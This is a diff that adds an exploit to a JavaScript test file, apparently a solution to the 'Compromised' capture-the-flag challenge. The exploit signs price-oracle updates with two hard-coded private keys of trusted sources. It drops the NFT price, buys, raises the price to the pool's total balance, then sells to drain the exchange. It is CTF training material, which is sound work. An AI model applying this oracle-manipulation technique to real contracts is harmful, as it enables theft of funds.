@@ -51,6 +51,72 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {
         /** YOUR EXPLOIT GOES HERE */
+
+        let trustedSource1 = '208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48'
+        let trustedSource2 = 'c678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+
+      
+        // 1. Begin by lowering the Price
+        let loweredPrice = ether('1');
+        let data = web3.eth.abi.encodeFunctionCall({
+            name: 'postPrice',
+            type: 'function',
+            inputs: [{
+                type: 'string',
+                name: 'symbol'
+            },{
+                type: 'uint256',
+                name: 'newPrice'
+            }]
+        }, ["DVNFT", loweredPrice.toString()]);
+
+        let txn = {
+            to: this.oracle.address,
+            gas: 3e6,
+            nonce: 0,
+            data: data 
+        }
+        web3.eth.accounts.signTransaction(txn,trustedSource1).then(signed=> {
+            web3.eth.sendSignedTransaction(signed.rawTransaction);
+        });
+        web3.eth.accounts.signTransaction(txn,trustedSource2).then(signed=> {
+            web3.eth.sendSignedTransaction(signed.rawTransaction);
+        });
+
+        // 2. Purchase the NFT at the LOWERED PRICE
+        await this.exchange.buyOne({from: attacker, value: ether('1')});
+
+        // 3. Before selling turn the price equal to the TOTAL TOKENS IN POOL
+        let maximumPrice = ether('10001');
+
+        data = web3.eth.abi.encodeFunctionCall({
+            name: 'postPrice',
+            type: 'function',
+            inputs: [{
+                type: 'string',
+                name: 'symbol'
+            },{
+                type: 'uint256',
+                name: 'newPrice'
+            }]
+        }, ["DVNFT", maximumPrice.toString()]);
+
+        txn = {
+            to: this.oracle.address,
+            gas: 3e6,
+            nonce: 1,
+            data: data 
+        }
+        web3.eth.accounts.signTransaction(txn,trustedSource1).then(signed=> {
+            web3.eth.sendSignedTransaction(signed.rawTransaction);
+        });
+        web3.eth.accounts.signTransaction(txn,trustedSource2).then(signed=> {
+            web3.eth.sendSignedTransaction(signed.rawTransaction);
+        });
+
+       // Start selling Process
+        await this.token.approve(this.exchange.address, 1, {from: attacker});
+        await this.exchange.sellOne(1, {from: attacker});
     });
 
     after(async function () {
